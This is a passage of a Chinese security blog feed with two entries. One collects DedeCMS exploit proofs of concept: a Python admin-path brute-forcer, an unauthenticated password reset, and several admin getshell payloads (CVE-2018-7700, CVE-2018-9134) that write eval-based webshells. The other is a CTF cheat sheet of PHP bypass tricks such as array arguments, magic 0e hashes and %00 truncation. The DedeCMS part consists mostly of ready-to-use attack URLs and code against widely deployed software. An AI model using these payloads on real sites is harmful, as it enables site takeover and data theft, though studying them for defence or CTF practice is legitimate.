class="keyword">for</span> ch <span class="keyword">in</span> characters:</span><br><span class="line"><span class="keyword">if</span> ch==characters[-1]:</span><br><span class="line">flag=1</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line">data[<span class="string">"_FILES[mochazz][tmp_name]"</span>]=data[<span class="string">"_FILES[mochazz][tmp_name]"</span>].format(p=str(back_dir+ch))</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Upload filetype not allow"</span> not <span class="keyword">in</span> r.text and r.status_code==200:</span><br><span class="line"> <span class="built_in">print</span> back_dir</span><br><span class="line"> back_dir+=ch</span><br><span class="line"> <span class="built_in">print</span> <span class="string">"[+]"</span>,back_dir</span><br><span class="line"> data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = <span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = <span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"后台地址为:"</span>,back_dir</span><br></pre></td></tr></table></figure></p><h1 id="dedecms利用通配符找后台目录及其防御方案"><a href="#dedecms利用通配符找后台目录及其防御方案" class="headerlink" title="dedecms利用通配符找后台目录及其防御方案"></a>dedecms利用通配符找后台目录及其防御方案</h1><p><a href="https://paper.tuisec.win/detail/d1053143f127862" target="_blank" rel="noopener">https://paper.tuisec.win/detail/d1053143f127862</a> </p><p>查看dede当前版本,补丁情况：</p><p><a href="http://120.24.86.145:9008/data/admin/ver.txt" target="_blank" rel="noopener">http://120.24.86.145:9008/data/admin/ver.txt</a></p><h1 id="漏洞组合拳-重置dedecms管理员后台密码重现及分析"><a href="#漏洞组合拳-重置dedecms管理员后台密码重现及分析" class="headerlink" title="漏洞组合拳 | 重置dedecms管理员后台密码重现及分析"></a>漏洞组合拳 | 重置dedecms管理员后台密码重现及分析</h1><p><a href="https://paper.tuisec.win/detail/9f8848f38c37fb4" target="_blank" rel="noopener">https://paper.tuisec.win/detail/9f8848f38c37fb4</a> </p><p>0×01 前台任意用户密码重置分析<br>POC:<br>第一步：访问<br><a href="http://192.168.0.6/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanwser=&amp;id=1" target="_blank" rel="noopener">http://192.168.0.6/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanwser=&amp;id=1</a> 得到key<br><img src="/posts/../../images/cms/dedecms3.png" alt=""><br>第二步，访问<br><a href="http://192.168.0.6/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=1&amp;key=MojdDnk2" target="_blank" rel="noopener">http://192.168.0.6/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=1&amp;key=MojdDnk2</a><br><img src="/posts/../../images/cms/dedecms4.png" alt=""><br>0x02前台任意用户登入</p><p>0x03后台用户登入</p><h1 id="DedeCMS-V5-7-UTF8-SP2"><a href="#DedeCMS-V5-7-UTF8-SP2" class="headerlink" title="DedeCMS-V5.7-UTF8-SP2"></a>DedeCMS-V5.7-UTF8-SP2</h1><p>（ 发布日期 2017-03-15 ）</p><h2 id="DedeCMS-v5-7-shops-delivery-存储型XSS"><a href="#DedeCMS-v5-7-shops-delivery-存储型XSS" class="headerlink" title="DedeCMS_v5.7_shops_delivery_存储型XSS"></a>DedeCMS_v5.7_shops_delivery_存储型XSS</h2><p><a href="https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_shops_delivery_%E5%AD%98%E5%82%A8%E5%9E%8BXSS</a><br>后台配送<br><img src="/posts/../../images/cms/dedecms1.png" alt=""></p><h2 id="dedeCMS-V5-7-SP2-后台Getshell"><a href="#dedeCMS-V5-7-SP2-后台Getshell" class="headerlink" title="dedeCMS V5.7 SP2 后台Getshell"></a>dedeCMS V5.7 SP2 后台Getshell</h2><p><a href="https://xz.aliyun.com/t/2071" target="_blank" rel="noopener">https://xz.aliyun.com/t/2071</a><br><img src="/posts/../../images/cms/dedecms2.png" alt=""></p><h2 id="Dedecms-V5-7后台任意代码执行-CVE-2018-7700"><a href="#Dedecms-V5-7后台任意代码执行-CVE-2018-7700" class="headerlink" title="Dedecms V5.7后台任意代码执行[CVE-2018-7700]"></a>Dedecms V5.7后台任意代码执行[CVE-2018-7700]</h2><p><a href="https://paper.tuisec.win/detail/4865b03a4ed783c" target="_blank" rel="noopener">https://paper.tuisec.win/detail/4865b03a4ed783c</a><br>poc:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.0.6/uploads/dede/tag_test_action.php?url=a&amp;token=&amp;partcode=&#123;dede:field name=&apos;source&apos; runphp=&apos;yes&apos;&#125;fputs(fopen(base64_decode(eWVzaTEucGhw),w),base64_decode(base64_decode(UEhOamNtbHdkQ0JzWVc1bmRXRm5aVDBpY0dod0lqNUFaWFpoYkNna1gxQlBVMVJiZVdWemFURmRLVHd2YzJOeWFYQjBQZz09)));&#123;/dede:field&#125;</span><br></pre></td></tr></table></figure></p><p>写入yesi1.php 密码yesi1</p><h2 id="DedeCMS-V5-7-SP2后台存在代码执行漏洞"><a href="#DedeCMS-V5-7-SP2后台存在代码执行漏洞" class="headerlink" title="DedeCMS V5.7 SP2后台存在代码执行漏洞"></a>DedeCMS V5.7 SP2后台存在代码执行漏洞</h2><p><a href="https://paper.tuisec.win/detail/6e00f45732a11ac" target="_blank" rel="noopener">https://paper.tuisec.win/detail/6e00f45732a11ac</a><br>poc:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.6/uploads/dede/tpl.php?filename=yesi.lib.php&amp;action=savetagfile&amp;content=&lt;script language=<span class="string">"php"</span>&gt;@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[yesi1])&lt;/script&gt;&amp;token=</span><br></pre></td></tr></table></figure></p><p>再访问：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.6/uploads/include/taglib/yesi.lib.php</span><br></pre></td></tr></table></figure></p><h1 id="Dedecms-V5-7-后台文件重命名-CVE-2018-9134-getshell"><a href="#Dedecms-V5-7-后台文件重命名-CVE-2018-9134-getshell" class="headerlink" title="Dedecms V5.7 后台文件重命名[CVE-2018-9134]  getshell"></a>Dedecms V5.7 后台文件重命名[CVE-2018-9134]  getshell</h1><p><a href="https://paper.tuisec.win/detail/3cfdfcc79be50de" target="_blank" rel="noopener">https://paper.tuisec.win/detail/3cfdfcc79be50de</a>  </p><p>poc:</p><p>先上传任意文件，再<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.6/dedecms/dede/file_manage_control.php?fmdo=rename&amp;oldfilename=dedecms/yesi.zip&amp;newfilename=dedecms/yesi.php</span><br></pre></td></tr></table></figure></p><h1 id="DedeCMS-v5-7-友情链接CSRF-GetShell"><a href="#DedeCMS-v5-7-友情链接CSRF-GetShell" class="headerlink" title="DedeCMS_v5.7_友情链接CSRF_GetShell"></a>DedeCMS_v5.7_友情链接CSRF_GetShell</h1><p><a href="https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/cms/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>php常见函数绕过</title>
    <link href="http://note.cfyqy.com/posts/90656947.html"/>
    <id>http://note.cfyqy.com/posts/90656947.html</id>
    <published>2018-09-18T13:21:00.000Z</published>
    <updated>2018-10-21T16:15:52.746Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="extract"><a href="#extract" class="headerlink" title="extract()"></a><a href="http://php.net/manual/zh/function.extract.php" target="_blank" rel="noopener">extract()</a></h1><p>extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖<br>kugku例题：<br> <a href="http://120.24.86.145:9009/1.php" target="_blank" rel="noopener">http://120.24.86.145:9009/1.php</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'xxx'</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$shiyan</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>解题：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?shiyan=&amp;flag=</span><br></pre></td></tr></table></figure></p><h1 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a><a href="http://www.php.net/manual/zh/function.strcmp.php" target="_blank" rel="noopener">strcmp()</a></h1><p>5.2 中是将两个参数先转换成string类型。<br>5.3.3以后，当比较数组和字符串的时候，返回是0。<br>5.5 中如果参数不是string类型，直接return了  </p><p>bugku例题:<a href="http://120.24.86.145:9009/6.php" target="_blank" rel="noopener">http://120.24.86.145:9009/6.php</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;No&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>解法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a[]=</span><br></pre></td></tr></table></figure><h1 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h1><p>1)PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><p>2)md5()不能处理数组。</p><p>bugku例题:<a href="http://120.24.86.145:9009/18.php" target="_blank" rel="noopener">http://120.24.86.145:9009/18.php</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'username'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>因为这里是”===”,所以只能用数组绕过<br>解法:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username[]=&amp;password[]=1</span><br></pre></td></tr></table></figure><h1 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a><a href="http://www.php.net/manual/zh/function.ereg.php" target="_blank" rel="noopener">ereg()</a></h1><p>bugku例题：<a href="http://120.24.86.145:9009/19.php" target="_blank" rel="noopener">http://120.24.86.145:9009/19.php</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'--'</span>) !== FALSE)</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>字符串对比解析<br>在这里如果 $_GET[‘password’]为数组，则返回值为NULL<br>如果为123%00–，则返回值为true<br>其余为false</p><p>解法一：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?password=123%00--</span><br></pre></td></tr></table></figure><p>解法二：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?password[]=</span><br></pre></td></tr></table></figure></p><h1 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h1><p>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> is_numeric(233333);       <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">echo</span> is_numeric(<span class="string">'233333'</span>);    <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">echo</span> is_numeric(0x233333);    <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">echo</span> is_numeric(<span class="string">'0x233333'</span>);   <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">echo</span> is_numeric(<span class="string">'233333abc'</span>);  <span class="comment"># 0</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>bugku例题：<a href="http://120.24.86.145:9009/22.php" target="_blank" rel="noopener">http://120.24.86.145:9009/22.php</a>  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure><p>解法一 ：<br>%00截断<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password=1337%00</span><br></pre></td></tr></table></figure></p><p>解法二：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password=1337qwe</span><br></pre></td></tr></table></figure></p><h1 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h1><p>md5 和 sha1 无法处理数组，返回 NULL  </p><p>bukug例题：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[&apos;name&apos;]);</span><br><span class="line">echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">var_dump($_GET[&apos;password&apos;]);</span><br><span class="line">var_dump(sha1($_GET[&apos;name&apos;]));</span><br><span class="line">var_dump(sha1($_GET[&apos;password&apos;]));</span><br><span class="line">if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">echo &apos;</span><br><span class="line"></span><br><span class="line">Your password can not be your name!</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;</span><br><span class="line">Invalid password.</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo &apos;</span><br><span class="line">Login first!</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>解题：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name[]=&amp;password[]=12</span><br></pre></td></tr></table></figure></p><h1 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a><a href="http://php.net/manual/zh/function.strpos.php" target="_blank" rel="noopener">strpos()</a></h1><p>数组绕过 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'ctf'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'ctf'</span>]) === FALSE)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'ctf'</span>], <span class="string">'#biubiubiu'</span>) !== FALSE)</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>解题：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ctf[]=</span><br></pre></td></tr></table></figure><h1 id="变量本身的key"><a href="#变量本身的key" class="headerlink" title="变量本身的key"></a>变量本身的key</h1><p>说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //key.php?aaaa<span class="string">'aaa=1&amp;bb'</span>b=2 </span><br><span class="line"></span><br><span class="line">    //print_R(<span class="variable">$_GET</span>); </span><br><span class="line"></span><br><span class="line">     foreach (<span class="variable">$_GET</span> AS <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> <span class="variable">$key</span>.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><h1 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a><a href="http://php.net/manual/zh/function.preg-match.php" target="_blank" rel="noopener">preg_match()</a></h1><p>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">'1.1.1.1 abcd'</span>; // 可以绕过</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/(\d+)\.(\d+)\.(\d+)\.(\d+)/"</span>,<span class="variable">$ip</span>)) &#123;</span><br><span class="line">  die(<span class="string">'error'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span>(<span class="string">'key...'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h1><p>== 是弱类型的比较，以下比较都为 true</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"><span class="built_in">echo</span> 0 == <span class="string">'a'</span> ;// a 转换为数字为 0    重点注意</span><br><span class="line"></span><br><span class="line">// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc</span><br><span class="line">// 十六进制与整数，被转换为同一进制比较</span><br><span class="line"><span class="string">'0xccccccccc'</span> == <span class="string">'54975581388'</span> ;</span><br><span class="line">// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0</span><br><span class="line">1 == <span class="string">'1'</span>;</span><br><span class="line">1 == <span class="string">'01'</span>;</span><br><span class="line">10 == <span class="string">'1e1'</span>;</span><br><span class="line"><span class="string">'100'</span> == <span class="string">'1e2'</span> ;    </span><br><span class="line"></span><br><span class="line">// 十六进制数与带空格十六进制数，被转换为十六进制整数</span><br><span class="line"><span class="string">'0xABCdef'</span>  == <span class="string">'     0xABCdef'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'0010e2'</span> == <span class="string">'1e3'</span>;</span><br><span class="line">// 0e 开头会被当成数字，又是等于 0*10^xxx=0</span><br><span class="line">// 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过</span><br><span class="line"><span class="string">'0e509367213418206700842008763514'</span> == <span class="string">'0e481036490867661113260034900752'</span>;</span><br><span class="line"><span class="string">'0e481036490867661113260034900752'</span> == <span class="string">'0'</span> ;</span><br><span class="line"></span><br><span class="line">var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</span><br><span class="line">var_dump(md5(<span class="string">'aabg7XSs'</span>) == md5(<span class="string">'aabC9RqS'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaroZmOk'</span>) == sha1(<span class="string">'aaK1STfY'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaO8zKZF'</span>) == sha1(<span class="string">'aa3OFF9m'</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h1><p>与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//var.php?var=new  </span><br><span class="line"><span class="variable">$var</span>=<span class="string">'init'</span>;  </span><br><span class="line">parse_str(<span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>]);  </span><br><span class="line"><span class="built_in">print</span> <span class="variable">$var</span>;</span><br></pre></td></tr></table></figure><h1 id="unset"><a href="#unset" class="headerlink" title="unset()"></a>unset()</h1><p>unset(bar);用来销毁指定的变量，如果变量bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过   </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">// http://127.0.0.1/index.php?_CONFIG=123</span><br><span class="line"><span class="variable">$_CONFIG</span>[<span class="string">'extraSecure'</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">foreach(array(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) as <span class="variable">$method</span>) &#123;</span><br><span class="line">    foreach($<span class="variable">$method</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">      // <span class="variable">$key</span> == _CONFIG</span><br><span class="line">      // $<span class="variable">$key</span> == <span class="variable">$_CONFIG</span></span><br><span class="line">      // 这个函数会把 <span class="variable">$_CONFIG</span> 变量销毁</span><br><span class="line">      <span class="built_in">unset</span>($<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_CONFIG</span>[<span class="string">'extraSecure'</span>] == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'flag &#123;****&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="intval"><a href="#intval" class="headerlink" 